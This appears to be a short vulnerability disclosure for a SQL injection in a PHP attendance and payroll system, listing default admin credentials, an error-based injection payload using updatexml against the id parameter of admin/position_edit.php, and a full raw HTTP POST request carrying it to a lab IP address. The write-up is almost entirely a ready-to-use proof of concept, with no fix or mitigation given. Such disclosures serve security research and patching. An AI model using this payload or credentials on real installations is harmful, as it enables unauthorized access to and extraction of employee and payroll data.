# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\position_edit.php has SQL injection

Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&title=Writer&rate=50&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159266903-689197c9-c027-4d8d-a340-5ae18262d41d.png)

```sql
POST /apsystem/admin/position_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 92
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/position.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&title=Writer&rate=50&edit=
```
![image](https://user-images.githubusercontent.com/54017627/159267162-65cb3550-75fe-4a78-9920-61a73a40da69.png)

![image](https://user-images.githubusercontent.com/54017627/159267001-4d58f228-a768-4157-a543-dad512cca615.png)
